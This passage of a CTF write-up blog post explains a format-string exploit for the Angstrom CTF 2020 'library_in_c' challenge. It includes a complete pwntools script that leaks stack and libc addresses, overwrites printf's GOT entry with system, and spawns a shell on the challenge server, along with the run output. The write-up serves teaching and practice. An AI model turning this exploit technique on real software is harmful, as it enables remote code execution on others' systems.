    &lt;span class=&quot;n&quot;&gt;hi_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;low_word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'printing {hi_byte} to {where +2} and {low_word} to {where}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hi_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hhn'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%12&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;low_word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hi_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'s&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%13&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After sending this payload to the first &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call, each of the following &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; calls will actually call &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; instead of printf. We overwrote itâ€™s &lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt; entry.&lt;/p&gt;

&lt;h3 id=&quot;putting-it-all-together&quot;&gt;Putting it all together&lt;/h3&gt;

&lt;p&gt;How the final exploit is executed:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;leak the addreses for future payloads&lt;/li&gt;
  &lt;li&gt;overwrite the return address to return to main&lt;/li&gt;
  &lt;li&gt;after returning to main, use additional &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;GOT&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;the next &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; call will actually be a &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; call. But wait, the next â€˜&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; is again called with our input as itâ€™s only argument, so we can simply send &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh\x00&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;system('/bin/sh')&lt;/code&gt; gets executed.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/CTFs/Angstrom2020/pwn/library_in_c# python3 xplt.py 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/root/CTFs/Angstrom2020/pwn/library_in_c/library_in_c'&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/root/CTFs/Angstrom2020/pwn/library_in_c/libc.so.6'&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Opening connection to shell.actf.co on port 20201: Done
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;address stored at 0x7ffea5436a18
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; libc at 0x7f80bb20b000
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; payload to ret2main b&lt;span class=&quot;s1&quot;&gt;'%20$n%64s%21$hn%1799s%22$hn     \x1cjC\xa5\xfe\x7f\x00\x00\x1ajC\xa5\xfe\x7f\x00\x00\x18jC\xa5\xfe\x7f\x00\x00'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; returning to main
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; printing 37 to 6295602 and 912 to 6295600
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sending overwrite payload b&lt;span class=&quot;s1&quot;&gt;'%12$37s%12$hhn%12$875s%13$hn    2\x10`\x00\x00\x00\x00\x000\x10`\x00\x00\x00\x00\x00'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode
                                                                                               %&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;bb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7f    2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10And what book would you like to check out?
sh: 1: Your: not found
sh: 2: -: not found
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;flag.txt
library_in_c
library_in_c.c
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
actf&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;us1ng_c_15_n3v3r_4_g00d_1d34&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploit-listing&quot;&gt;Exploit listing&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

def write(what, where):
    what = what &amp;amp; 0xffffff
    hi_byte = what &amp;gt;&amp;gt; 16
    low_word = what &amp;amp; 0xffff

    log.info(f'printing {hi_byte} to {where +2} and {low_word} to {where}')

    payload = b'%12$'
    payload += str(hi_byte).encode()
    payload += b's%12$hhn'
    payload += b'%12$'
    payload += str(low_word -hi_byte).encode()
    payload += b's%13$hn'
    payload += (32-len(payload))*b' '
    payload += p64(where+2)
    payload += p64(where)
    return payload

def check_payload(payload):
    if b'\n' in payload:
        log.error('error, payload contains newline')

context.log_level = &quot;info&quot;

elf = ELF('./library_in_c')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = elf.symbols['main']

#r = process('./library_in_c')
r = remote('shell.actf.co', 20201)
#r = remote('localhost', 8080)

payload_leak = '%24$p %27$p'

r.sendline(payload_leak)
s = r.recvline()
s = r.recvline()
s = r.recvline()

stack_leak = int(s.split(b' ')[-2], 16)
ret_addr = stack_leak -216
libc_leak = int(s.split(b' ')[-1], 16)
libc_address = libc_leak - 0xf0 - libc.symbols['__libc_start_main']
libc_system = libc_address + libc.symbols['system']


log.info(f'return address stored at {hex(ret_addr)}')
log.info(f'libc at {hex(libc_address)}')

payload_ret2main = b'%20$n%64s%21$hn%1799s%22$hn     '
payload_ret2main += p64(ret_addr + 4)
payload_ret2main += p64(ret_addr + 2)
payload_ret2main += p64(ret_addr)

log.info(f'payload to ret2main {payload_ret2main}')
log.info('returning to main')

r.sendline(payload_ret2main)


s = r.recv()

payload_overwrite_got = write(libc_system, elf.symbols['got.printf'])
log.info(f'sending overwrite payload {payload_overwrite_got}')
r.sendline(payload_overwrite_got)
r.sendline(b'/bin/sh\x00')
r.recv()
r.interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Jakub Acs</name><email>acsjakub@gmail.com</email></author><category term="ctf" /><category term="pwn" /><category term="write-up" /><summary type="html">I recently took part in Angstrom CTF 2020, together with my team DISsect@CTU. As usual, I focused on the pwn category and I decided to share write-up of the most interesting challenge with you int this blog post. The challenges are still online and working, just like PicoCTF, so I encourage you to go ahead and try them.</summary></entry></feed>